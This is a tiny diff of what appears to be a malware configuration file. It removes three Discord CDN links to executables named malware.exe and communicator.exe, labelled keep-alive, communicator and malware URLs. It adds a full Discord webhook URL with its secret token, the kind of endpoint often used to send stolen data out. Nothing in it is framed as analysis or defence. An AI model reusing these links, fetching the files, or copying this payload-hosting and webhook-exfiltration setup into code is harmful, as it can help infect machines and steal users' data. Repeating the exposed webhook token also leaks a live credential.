@@ -1,3 +1,1 @@
-keep_alive_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390533310152765/malware.exe?
-communicator_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390575232090112/communicator.exe?
-malware_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390533310152765/malware.exe?
+https://discord.com/api/webhooks/1302459865712824322/VtPJlJZOPqTQdt4u0VJxILSSIJTGNr78226BVdZhN5IK8s3EBXucZ_x1VfXwFABRwBAX
